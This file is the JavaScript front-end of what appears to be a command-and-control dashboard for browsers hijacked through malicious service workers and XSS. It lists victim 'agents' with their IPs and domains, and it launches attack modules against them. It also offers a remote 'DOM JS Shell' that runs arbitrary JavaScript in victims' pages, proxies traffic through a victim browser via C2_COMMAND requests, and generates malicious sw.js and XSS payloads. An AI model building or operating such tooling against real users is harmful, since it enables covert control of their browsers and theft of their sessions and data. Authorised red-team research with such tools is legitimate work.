var agents, dormantAgents, modules;
var proxyAgent = null;
var agentDisplayed = null;
var refreshRate = 2000;
var fetchAgentAbortcontroller = new AbortController();
var signal = fetchAgentAbortcontroller.signal;
var queuefetchAgentRequests = new Array();

function resetAbortFetchAgentController(){
  fetchAgentAbortcontroller = new AbortController();
  signal = fetchAgentAbortcontroller.signal;
}

function addAgents2sidebar(agent, sidebarId){
  var date = new Date(null);
  var aClass = (agent.active === 'true') ? 'active' : 'dormant' ;  

  if (agent.active === 'false') {
    closeButton = `<button type="button" class="close" aria-label="Close" data-action='delete-agent'>
                    <i class="fas fa-times-circle shadow-none" style="color: red"></i>
                    </button>`;
  } else {
    closeButton = ''
  }

  var newAgent = `
  <li class="nav-item list-group" id="sidebar-${agent.id}">
    <a class="nav-link ${aClass}" href="#" data-agent-id='${agent.id}' data-action='show-agent'>
      <span data-feather="file-text"></span>
      <div class="card card-${aClass}">
      <span class="d-block p-2 bg-secondary text-white" ><i class="far fa-user" style="color: white"></i> ${agent.id}
      ${closeButton}
      </span>
      <div class="card-body smaller-card">
      <i class="fas fa-network-wired"></i> ${agent.domain}<br/>
          </div>
      </div>
    </a>
  </li>
  `;
  $(sidebarId).append(newAgent);
}

function getModules(){
  fetch(dashUrl() + '/modules').then(function(response){
    response.json().then(function(data){
      modules = data.modules;
      var autoLoadedModules = data.autoLoadedModules;
      for(i = 0; i < modules.length; i++){
        var autoLoaded = autoLoadedModules.indexOf(modules[i]) >= 0;
        var modulesHTML = `<hr/><img src="/static/images/tick.png"`;
        var modulesHTML = ` 
        <div class="custom-control custom-switch col fetch-left" > 
        <input id="${modules[i]}" type="checkbox" ${autoLoaded?'checked':''} class="custom-control-input" data-action='auto-load-module' data-loaded='${autoLoaded}' data-module-name='${modules[i]}' >
        <label class="custom-control-label text-light" for="${modules[i]}"> ${modules[i]}</label>
        </div>
        `
        $('div#automodules_settings').append(modulesHTML);
      }
    });
  });
}

function updateDisplayStatus(){
  if(proxyAgent !== null && !(proxyAgent in agents)){ // if proxy agent displayed changes from dormant, remove proxy and refresh agent
    showAgent(proxyAgent);
    $("a#clear-proxy").click();
    proxyAgent = null;
  }else{ // if current agent displayed changes from active to dormant or viceversa, refresh it
    checkAgentShownStatus();
  }
}

function checkAgentShownStatus(){
  if(agentDisplayed !== null){
    if(agentDisplayed.active === 'true' && !(agentDisplayed.id in agents)){
      // if was active and now not
      showAgent(agentDisplayed.id);
    }
    if(agentDisplayed.active === 'false' && !(agentDisplayed.id in dormantAgents)){
      // if was dormant and now awake
      showAgent(agentDisplayed.id);
    }

    // Update Dom Status of displayed agent
    if(agentDisplayed.domActive == 'true'){
      $('#domstatus').text('Online');
      $('#domstatus').attr('class','text-success')
    }else{
      $('#domstatus').text('Offline');
      $('#domstatus').removeClass()

    }
  }
}

function updateSidebar(){
  fetch(dashUrl() + '/agents').then(function(response){
    response.json().then(function(data){
	    agents = data.active;
      dormantAgents = data.dormant;
      updateDisplayStatus();
      if(agentDisplayed !== null && agentDisplayed.id in agents) 
        agentDisplayed = agents[agentDisplayed.id];
      else if(agentDisplayed !== null && agentDisplayed.id in dormantAgents) 
        agentDisplayed = dormantAgents[agentDisplayed.id];
      $('#agents-sidebar').html('');
      for(var agentID in agents)
  	    addAgents2sidebar(agents[agentID], '#agents-sidebar');
      $('#dormant-agents-sidebar').html('');
      for(var agentID in dormantAgents)
  	    addAgents2sidebar(dormantAgents[agentID], '#dormant-agents-sidebar');
    });
  });
}

// SHOW AGENT
function showAgent(agentID){
  if(queuefetchAgentRequests.length !== 0){
    fetchAgentAbortcontroller.abort();
    resetAbortFetchAgentController();
  }
  var $mainPanel = $('#agents-main');
  queuefetchAgentRequests.push(1);
  fetch(dashUrl() + '/agent/' + agentID, { signal }).
    then(function(response){
      queuefetchAgentRequests.pop();
      response.json().then(function(agent){
        agentDisplayed = agent;
      	agentHtml = `
      	<br/>
        <div class="jumbotron" id="agent_info_panel">
        <div class="row">
          <div class="col-6">
            <h3 class="display-4">${agent.id}</h3>
          </div>
          <div class="col-6 float-right">
          <button type="button" id="proxy-through-agent" class="btn btn-secondary" data-agent-id="${agent.id}"> <i class="fab fa-hubspot"></i> Proxy through Agent</button> 
          <button type="button" class="btn btn-secondary" data-agent-id="${agent.id}" id="trigger-push"><i class="fas fa-bell"></i>Push</button>

          `

          // [Start] Dropdown button for modules
          agentHtml += `
          <button class="btn btn-secondary dropdown-toggle" type="button" id="ExecuteModules" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
          <i class="fas fa-rocket"></i> Modules
          </button>
          <div class="dropdown-menu" aria-labelledby="ExecuteModules">
          `
          for(i = 0; i < modules.length; i++){
            if(!agent.modules || !(modules[i] in agent.modules))
            //agentHtml += `<button type="button" data-module='true' data-module-name="${modules[i]}" class="btn btn-secondary" data-agent-id="${agent.id}">Execute ${modules[i]} Module</button> `;
            agentHtml += `<a class="dropdown-item" href="#" data-module='true'data-module-name="${modules[i]}" data-agent-id="${agent.id}">${modules[i]}</a>`
          }
          agentHtml += `</div>`
          // [End] Dropdown button for modules
        agentHtml +=`</div>
        </div>
      	  <br/>
        	<b><i class="fas fa-globe-americas"></i> IP: </b>${agent.ip}</b>
          <br/>
          <b><i class="fas fa-user-cog"></i> UserAgent: </b>${agent.user_agent}<br>
        	<i class="fas fa-clock"><b></i> First Seen:</b>
          ${agent.first_seen} 
          <br/>
        	<i class="fas fa-sitemap"></i><b> Domain:</b>
          <a href="https://${agent.domain}:${agent.port}" target="_blank">${agent.domain}:${agent.port}</a>
          <br/>
          <br/>
        	<b>Service Worker Status:</b>`;
        if(agent.active == 'true')
          agentHtml += `<p class='text-success'>Online <i class="fas fa-plug" style="color: LimeGreen"></i></p>`;
        else
          agentHtml += `<p>Offline <i class="fas fa-plug" style="color: Red"></i></p>`;
        agentHtml += `<b>DOM Status:</b>`;

        //[Start] DOM Status and Terminal Switch
        agentHtml += `<div class="row">
        <div class="col-2"><label id='domstatus'>Offline</label></div>
        <div class="custom-control custom-switch col fetch-left">
          <input type="checkbox" class="custom-control-input" id="show_dom_shell">
          <label class="custom-control-label" for="show_dom_shell"><i class="fas fa-terminal"></i> DOM JS Shell</label>
        </div>
        </div>
        `
        //[End]  DOM Status and Terminal Switch

        if(agent.modules){
          agentHtml += `<hr/>`;
          agentHtml += `<h3>Module Results:</h3>`;
          for(var moduleName in agent.modules){
            agentHtml += `<h4>${moduleName}<button type="button" class="close" aria-label="Close" 
                          data-module-name='${moduleName}' data-agent-id='${agent.id}' data-action='delete-module'>
                          <span aria-hidden="true">&times;</span>
                         </button></h4>`;
            agentHtml += `<p>${agent.modules[moduleName]}</p>`;
            agentHtml += `<hr/>`;
          }
        }

        agentHtml += `
        </div>`;        
        $mainPanel.html(agentHtml);
        $('#initial-main').hide();
        $mainPanel.show();

        // Now that the agentHTML has been attached to dom, lets set the buttons status
        $(function(){
          if (proxyAgent == agentID){ // Set color of ProxyButton
            $("button#proxy-through-agent").attr("class", "btn btn-success");
          }
          else{
            $("button#proxy-through-agent").attr("class", "btn btn-secondary");
          }
          if(agent.active === "true"){ //Enable/disable proxy button
            $("button#proxy-through-agent").removeAttr("disabled");
          }
          else{
            $("button#proxy-through-agent").attr("disabled","true");
          }
          if(agent.push === 'true'){ // Enable/Disable Push button
            $("button#trigger-push").removeAttr("disabled");
          }
          else{
            $("button#trigger-push").attr("disabled","true");
          }

        })
    });
  });
}

// Switch for JS Terminal
$(document).on("click", "#show_dom_shell", function() {
  if ($('input#show_dom_shell').is(":checked") && $('#terminal').length == 0) {
    $('#agent_info_panel').append($('<div>', {
      class: 'terminal',
      id: 'terminal'
    }));  
    term = $('#terminal').terminal(function(command, term) {
      term.pause();
      $.ajax({
        type: "POST",
        contentType: "application/json",
        url: 'dom/' + agentDisplayed.id,
        data: JSON.stringify({
          js: command
        }),
        dataType: "json"
      }).done(function(response) {
        if (('result' in response) && response['result'] != null) {
          term.echo(response['result']).resume();
        } else if (('result' in response) && response['result'] == null) {
          term.echo("Null").resume();
        } else {
          term.echo("timeout").resume();
        }
      }).fail(function(response) {
        term.echo("Timeout..dom agent probably offline.. JS will run the next time agent gets back online").resume();
      });
    });
  } else if (!$('input#show_dom_shell').is(":checked") && $('#terminal').length != 0) {
    $('#terminal').remove();
  }
});

// LOAD MODULE AGAINST AGENT
$(document).on("click", "[data-module='true']", function(){
  var $btn = $(this);
  fetch(dashUrl() + `/module/${$btn.data('module-name')}/${$btn.data('agent-id')}`, 
    {
      method: 'POST',
      headers: new Headers({'content-type': 'application/json'})
    }
  ).then(function(res){
    if(!res.ok){
      $btn.attr("class", "btn btn-danger");
    }
    else{
      $btn.attr("class", "btn btn-success");
      setTimeout(function(){showAgent($btn.data('agent-id'))}, 1700);
    }
  });
});

// DELETE MODULE AGAINST AGENT
$(document).on("click", "[data-action='delete-module']", function(){
  var $btn = $(this);
  $btn.hide();
  fetch(dashUrl() + `/module/${$btn.data('module-name')}/${$btn.data('agent-id')}`, {method: 'DELETE'}).then(function(){
    showAgent($btn.data('agent-id'));
  });
});

// AUTO LOAD MODULE ON NEW AGENT
$(document).on("click", "input[data-action='auto-load-module']", function(){
  var $btn = $(this);
  $btn.hide();
  var wasLoaded = $btn.data('loaded') === true;
  var method = wasLoaded ? 'DELETE' : 'POST';
  fetch(dashUrl() + `/automodule/${$btn.data('module-name')}`, 
    {
      method: method,
      headers: new Headers({'content-type': 'application/json'})
    }
  ).then(function(){
    if(wasLoaded){
      $btn.prev().hide();
      $btn.data('loaded', false);
    }else{
      $btn.prev().show();
      $btn.data('loaded', true);
    }
    $btn.show();
  });
});

// LOAD AGENT DETAILS
$(document).on("click", "a[data-action='show-agent']", function(){
	showAgent($(this).data('agent-id'));
});

// DELETE AGENT
$(document).on("click", "button[data-action='delete-agent']", function(event){
  event.stopPropagation();
  $btn = $(this);
  var agentID = $btn.closest('a').data('agent-id');
  $btn.hide();
  fetch(dashUrl() + `/agent/${agentID}`, {method: 'DELETE'}).then(function(res){
    if(res.ok){
      if(agentID == agentDisplayed.id){
        agentDisplayed = null;
        $('#agents-main').hide();
        $('#initial-main').show();
      }
      $(`li#sidebar-${agentID}`).remove();
    }
  });
});

// TRIGGER PUSH
$(document).on("click", "button#trigger-push", function(){
  var $btn = $(this);
  fetch(dashUrl() + `/push/${$(this).data('agent-id')}`, 
    {
      method: 'POST',
      headers: new Headers({'content-type': 'application/json'})
    }
  ).then(function(res){
    if(!res.ok){
      $btn.attr("class", "btn btn-danger");
    }
    else{
      $btn.attr("class", "btn btn-success");
      setTimeout(function(){$btn.attr("class", "btn btn-secondary")}, 2000);
    }
  });
});

// PROXY THROUGH AGENT
$(document).on("click", "button#proxy-through-agent", function(){
  var $btn = $(this);
  var agentID = $btn.data('agent-id');
	fetch(proxyUrl() + '/C2_COMMAND?action=setproxy&domain=' + agents[agentID]['domain'] + '&port=' + agents[agentID]['port'] + '&agentID=' + agentID,
    {method: 'GET', mode: "no-cors"}).then(function(){
      proxyAgent = agentID;
      $btn.attr("class", "btn btn-success");
      $("#proxy-status-bar").html(`Status: Proxying through <p class='text-success'>${agentID}</p>`);
  });
});

// CLEAR PROXY
$(document).on("click", "a#clear-proxy", function(){
  if(proxyAgent !== null){
    proxyAgent = null
  	fetch(proxyUrl() + '/C2_COMMAND?action=clearproxy', {method: 'GET', mode: "no-cors"}).then(function(){
      $("#proxy-status-bar").html('Status: Not Proxying');
      $("button#proxy-through-agent").attr("class", "btn btn-secondary");
    });
  }
});

//Generate SW.JS
$(document).on("click", "#genSW", function(){
  window.open("/modules/sw.js");
});

//Generate XSS.JS
$(document).on("click", "#genXSS", function(){
  window.open("/modules/xss");
});

function proxyUrl(){
  return window.location.protocol +"//" + window.location.hostname;
}

function c2Url(){
  return window.location.protocol + '//' + window.location.hostname + ':' + window.location.port;
}

function dashUrl(){
  return c2Url() + '/dashboard';
}

$(document).ready(function(){
  getModules();
  setInterval(updateSidebar, refreshRate);
  navigator.serviceWorker.register('sw.js').then(function(s){
    Notification.requestPermission().then(function(){
      s.active.postMessage({'p':'1'})
    });
  });
});

// [Start] Settings overlay
function openSettings(){
  $("#settingsOverlay").css("height", "100%");
}

function closeSettings(){
  $("#settingsOverlay").css("height", "0%");
}

$(document).on("click", "#settingsOverlay button, #settingsOverlay input, #settingsOverlay label", function(e){
  e.stopPropagation();
});

$(document).on("click", "#settingsOverlay", function(){
  closeSettings();
});

$(document).on("click", "[data-overlay='open']", function(){
  openSettings();
});
// [End] Settings overlay